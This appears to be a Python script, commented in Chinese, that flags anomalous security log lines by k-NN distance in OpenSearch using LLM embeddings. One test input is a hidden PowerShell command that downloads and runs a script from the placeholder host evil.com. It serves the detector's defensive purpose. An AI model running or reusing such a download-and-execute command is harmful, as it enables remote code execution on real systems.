import os
from dotenv import load_dotenv
from opensearchpy import OpenSearch
from .llm_client import LLMClient

# 1. 初始化
load_dotenv()
llm = LLMClient()
client = OpenSearch(
    hosts=[{'host': 'localhost', 'port': 9200}],
    http_compress=True,
    use_ssl=False
)
index_name = "security-logs-knn"

# 設定「異常閾值」
# 因為我們用 L2 (歐幾里得距離)，距離越「大」代表越「不樣」
# 經驗值：0.5 ~ 0.6 以上通常很有可能是異常
THRESHOLD = 0.5 

def detect(log_text):
    print(f"\n🔎 正在分析 Log: '{log_text}'")
    
    # 1. 取得向量
    vector = llm.get_embedding(log_text)
    
    # 2. 去 OpenSearch 搜尋「最像的 1 筆」資料 (k=1)
    # 這裡我們只看最近的那一個鄰居就好
    query = {
        "size": 1,
        "query": {
            "knn": {
                "log_vector": {
                    "vector": vector,
                    "k": 1
                }
            }
        }
    }
    
    response = client.search(index=index_name, body=query)
    
    # 3. 解析結果
    if response["hits"]["hits"]:
        match = response["hits"]["hits"][0]
        score = match["_score"]  # OpenSearch 的分數
        # 注意：OpenSearch 的 L2 score 公式是 1 / (1 + L2_Distance)
        # 所以我們要反推回原本的 L2 距離
        l2_distance = (1 / score) - 1
        
        print(f"   -> 最相似的歷史紀錄: {match['_source']['log_text']}")
        print(f"   -> 差異距離 (L2 Distance): {l2_distance:.4f}")
        
        # 4. 判斷是否異常
        if l2_distance > THRESHOLD:
            print(f"   🚨 [警告] 距離過大 (> {THRESHOLD})！判定為【異常行為】")
            print("   (這條 Log 跟我們已知的正常行為差異太大，可能是攻擊！)")
        else:
            print(f"   ✅ [正常] 距離在安全範圍內。")
    else:
        print("   ⚠️ 資料庫是空的，無法比對。")

def main():
    # --- 測試案例 ---
    
    # 案例 A: 看起來很正常的 Log (應該要是 ✅)
    # 雖然這句話沒在資料庫裡，但語意跟 "User admin logged in..." 很像
    normal_test = "User david logged in successfully from IP 10.0.0.1 via VPN."
    detect(normal_test)
    
    # 案例 B: 明顯的攻擊語法 (應該要是 🚨)
    # 這是 PowerShell 惡意下載指令，跟我們之前存的 "備份"、"登入" 完全不同
    malicious_test = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1')"
    detect(malicious_test)

if __name__ == "__main__":
    main()